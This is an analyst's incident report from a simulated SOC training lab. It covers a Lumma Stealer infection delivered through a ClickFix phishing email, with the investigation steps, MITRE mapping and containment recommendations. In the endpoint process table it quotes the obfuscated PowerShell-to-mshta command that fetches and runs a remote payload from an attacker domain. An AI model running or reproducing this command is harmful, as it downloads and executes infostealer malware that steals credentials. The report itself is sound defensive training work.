# Incident Report — Lumma Stealer via ClickFix Phishing

**Analyst:** Juan Soto · **Environment:** LetsDefend simulated SOC · **Alert:** SOC338 (Event ID 316) · **Severity:** Critical · **Verdict:** True Positive — successful compromise

> Educational SOC investigation on the LetsDefend training platform. All users, hosts and IPs are lab artifacts.

---

## Executive summary

A phishing email impersonating a "Windows 11 Pro upgrade" reached a user's inbox and led to a **Lumma Stealer** infection through the **ClickFix** technique — a social-engineering lure that tricks the user into pasting and running a malicious command themselves (often disguised as a "I am not a robot" verification). Correlating email, proxy and endpoint telemetry proved the user clicked through from the email and executed the payload, and it surfaced a **second-stage command-and-control domain that the original alert never named**. Closed as a true positive; recommended containment of the host.

## Alert details

| Field | Value |
|---|---|
| Rule | SOC338 — Lumma Stealer — DLL Side-Loading via Click Fix Phishing |
| Event time | 2025-03-13 09:44 |
| From | `update@windows-update.site` |
| Subject | "Upgrade your system to Windows 11 Pro for FREE" |
| To | `dylan@letsdefend.io` (host `Dylan`, 172.16.17.216) |
| Malicious URL (alert) | `https://windows-update[.]site/` |
| Device action | Allowed / delivered |

## Investigation

1. **Email analysis.** The message was a phishing lure with an embedded hyperlink to `windows-update[.]site`. Reputation checks (VirusTotal, AbuseIPDB, LetsDefend Threat Intel) flagged the URL as malicious and associated it with Lumma Stealer distribution via ClickFix.
2. **Delivery.** Exchange logs confirmed the email was **allowed and delivered** to the user's inbox — not blocked at the gateway.
3. **Did the user act on it?** Pivoted to the endpoint (`Dylan`) process history and found the ClickFix execution chain (23:26:20–23:26:32):

   | Process (in order) | Note |
   |---|---|
   | `powershell.exe -w 1 powershell -Command ('ms]]]ht]]]a]]].]]]exe https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4' -replace ']') # ✅ 'I am not a robot - reCAPTCHA...'` | ClickFix payload — bracket-obfuscated `mshta` command with a fake CAPTCHA comment, exactly what the user was told to paste |
   | `powershell.exe -Command "mshta.exe https://overcoatpassably.shop/.../maloy.mp4"` | De-obfuscated call |
   | `mshta.exe https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4` | `mshta` executes the remote payload disguised with an `.mp4` extension |

4. **Key finding.** The endpoint evidence exposed **`overcoatpassably.shop`** as the real payload/second-stage host. The alert only named `windows-update.site`; the actual malware retrieval domain was only visible on the host — a reminder to always confirm the full chain, not just the alert's indicators.

## Verdict & impact

**True Positive — attack successful.** The phishing email was delivered, the user executed the ClickFix command, and `mshta.exe` retrieved a payload from attacker infrastructure. Treat as an infostealer compromise: assume credentials/session data on `Dylan` are at risk.

## MITRE ATT&CK

- **T1566.002** — Phishing: Spearphishing Link
- **T1204** — User Execution (ClickFix — user pastes/runs the command)
- **T1218.005** — System Binary Proxy Execution: Mshta
- Supporting: T1059.001 (PowerShell), T1027 (obfuscation)

## Response & recommendations

1. **Contain `Dylan`** (EDR isolation) — infostealer execution confirmed.
2. **Delete the email** from any other recipients and block the sender domain `windows-update.site`.
3. **Block** `overcoatpassably.shop` and the payload URL at proxy/DNS; add both domains to threat intel.
4. **Reset the user's credentials** and invalidate active sessions/tokens (Lumma targets browser cookies, passwords, crypto wallets).
5. **Hunt** for the same ClickFix pattern (`mshta` spawned from PowerShell with bracket obfuscation) across other endpoints.

## Lesson learned

ClickFix defeats attachment- and macro-based detection because the **user is the execution mechanism**, so the signal lives on the endpoint, not the mail gateway. Pairing "did the mail get delivered?" with "what did the host actually run?" is what turned a suspicious email into a confirmed infection — and revealed C2 infrastructure the alert missed.
